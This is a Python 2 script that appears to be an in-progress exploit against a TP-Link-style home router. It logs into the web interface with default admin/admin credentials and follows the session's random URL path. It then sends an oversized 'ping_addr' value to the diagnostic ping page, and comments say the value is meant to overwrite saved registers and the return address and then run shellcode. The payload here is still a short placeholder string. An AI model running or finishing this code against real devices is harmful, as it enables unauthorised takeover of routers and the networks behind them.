import urllib2
import urllib
import base64
import hashlib



def login(ip, user, pwd):
	hash = hashlib.md5()
	hash.update(pwd)
	auth_string = "%s:%s" %(user, hash.hexdigest())
	encoded_string = base64.b64encode(auth_string)
	print "[debug] Encoded authorisation: %s" %encoded_string#### Send the request
	url = "http://" + ip + "/userRpm/LoginRpm.htm?Save=Save"
	req = urllib2.Request(url)
	req.add_header('Cookie', 'Authorization=Basic %s' %encoded_string)
	resp = urllib2.urlopen(req)#### The server generates a random path for further requests, grab that here
	data = resp.read()
	next_url = "http://%s/%s/userRpm/" %(ip, data.split("=")[2].split("/")[3])
	print "[debug] Got random path for next stage, url is now %s" %next_url
	return (next_url, encoded_string)

def exploit_normal(url, auth):
	#trash,control of s0,s1   +     ra  +   shellcode
	evil = "zyw"*8
	#evil ="zywzywzyw"*80
	params = {'ping_addr': evil, 'doType': 'ping', 'isNew': 'new', 'sendNum': '20', 'pSize': '64', 'overTime': '800', 'trHops': '20'}

	new_url = url + "PingIframeRpm.htm?" + urllib.urlencode(params)

	req = urllib2.Request(new_url)
	req.add_header('Cookie', 'Authorization=Basic %s' %auth)
	req.add_header('Referer', url + "DiagnosticRpm.htm")

	resp = urllib2.urlopen(req)

def exploit(url, auth):
	#trash,control of s0,s1   +     ra  +   shellcode
	#evil = "\x41"*8
	evil = "zyw"*8
	#evil ="zywzywzyw"*80
	params = {'ping_addr': evil, 'doType': 'ping', 'isNew': 'new', 'sendNum': '20', 'pSize': '64', 'overTime': '800', 'trHops': '20'}

	new_url = url + "PingIframeRpm.htm?" + urllib.urlencode(params)

	req = urllib2.Request(new_url)
	req.add_header('Cookie', 'Authorization=Basic %s' %auth)
	req.add_header('Referer', url + "DiagnosticRpm.htm")
	resp = urllib2.urlopen(req)

if __name__ == '__main__':
	'''
	buf="GET /HPHDRANAZJAYZNLA/userRpm/PingIframeRpm.htm?sendNum=20&isNew=new&doType=ping&pSize=64&overTime=800&trHops=20&ping_addr="+"zyw"*8+" HTTP/1.1\r\n"
	buf+="Accept-Encoding: identity\r\n"
	buf+="Cookie: Authorization=Basic YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=\r\n"
	buf+="Host: 192.168.0.1\r\n"
	buf+="Referer: http://192.168.0.1/HPHDRANAZJAYZNLA/userRpm/DiagnosticRpm.htm\r\n"
	buf+="Connection: close\r\n"
	buf+="User-Agent: Python-urllib/2.7\r\n\r\n"
	'''
	login("192.168.0.1", "admin", "admin")
	data = login("192.168.0.1", "admin", "admin")
	exploit(data[0], data[1])